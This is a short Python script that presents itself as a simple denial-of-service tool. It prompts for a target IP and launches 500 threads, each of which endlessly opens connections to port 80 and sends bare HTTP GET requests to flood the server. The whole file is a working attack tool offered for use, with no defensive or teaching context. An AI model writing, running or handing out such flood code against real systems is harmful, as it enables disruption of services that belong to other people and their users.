import socket
import threading

print("Welcome, this is  simple Denial Of Service tool.\n\n")

target = input("Enter target IP: ")
port = 80

attack_num = 0

def HTTP():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + "\r\n\r\n").encode('ascii'), (target, port))

        global attack_num
        attack_num += 1
        print(attack_num)
        
        s.close()


for i in range(500):
    thread = threading.Thread(target = HTTP)
    thread.start()